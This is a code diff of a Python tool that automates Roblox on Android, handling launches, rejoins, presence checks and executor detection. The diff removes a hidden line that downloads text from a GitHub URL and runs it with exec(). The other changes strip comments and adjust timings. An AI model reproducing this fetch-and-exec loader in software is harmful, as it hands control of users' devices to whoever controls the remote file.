@@ -19,11 +19,6 @@ from threading import Lock
 
 init()
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
 SERVER_LINKS_FILE = "Private_Server_Link.txt"
 ACCOUNTS_FILE = "Account.txt"
 CONFIG_FILE = "Config.json"
@@ -198,7 +193,7 @@ def check_executor_status(username, continuous=False, max_wait_time=240, check_i
                 break  # Exit the loop once a valid workspace is found
 
         if active_workspace:
-            break  # Stop searching once we find a valid workspace
+            break 
 
     if not active_workspace:
         # No valid workspace found; skip executor check silently
@@ -705,44 +700,35 @@ def kill_roblox_process(package_name):
     os.system(f"pkill -f {package_name}")
     time.sleep(2) 
 
-# Function to launch Roblox
 def launch_roblox(package_name, server_link, num_packages, package_statuses):
     try:
-        # Update the status to indicate Roblox is opening
         package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Opening Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
 
-        # Open Roblox (Initial Splash)
         subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(15 if num_packages >= 6 else 8)  # Adjust wait time based on the number of packages
+        time.sleep(5)
 
-        # Proceed to launch
         package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Joining Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
         subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        # Wait a moment to ensure Roblox has launched
         time.sleep(20)
         
-        # Update the status after successful join
         package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
         update_status_table(package_statuses)
 
     except Exception as e:
-        # Catch all exceptions and log them specifically to avoid "launching failed" messages
         package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Error details: {e}")
 
 def check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts):
     try:
-        # Inject Lua script for executor detection (the username is auto-detected in the Lua script)
         detected_executors = detect_and_write_lua_script()
 
         if detected_executors:
             print(f"Checking executor status for {package_name} with username {username}...")
 
-            # Keep checking for the executor status, up to 2 minutes (every 10 seconds)
             start_time = time.time()
             executor_loaded = False
             while time.time() - start_time < 120:  # 2 minutes timeout
@@ -1019,7 +1005,7 @@ def save_cache():
         
 def check_user_online(user_id):
     max_retries = 3
-    delay = 2
+    initial_delay = 1  
 
     for attempt in range(max_retries):
         try:
@@ -1035,20 +1021,19 @@ def check_user_online(user_id):
 
             if primary_last_location == "Website":
                 print(Fore.YELLOW + f"{user_id} is currently on the Website. Rejoin recommended." + Style.RESET_ALL)
-                primary_presence_type = 0  # Set presence type to offline to trigger a rejoin
+                primary_presence_type = 0  
 
             return primary_presence_type, primary_last_location
 
         except requests.exceptions.RequestException as e:
             print(Fore.RED + f"Error checking online status for user {user_id} (Attempt {attempt + 1}): {e}" + Style.RESET_ALL)
             if attempt < max_retries - 1:
-                time.sleep(delay)
-                delay *= 2  # Exponential backoff
+                time.sleep(initial_delay)
+                initial_delay *= 1.5  
             else:
                 return None, None
 
 def get_hwid_file_path(package_name):
-    # Specify the directory
     directory = f"/data/data/{package_name}/app_assets/content/"
     
     try:
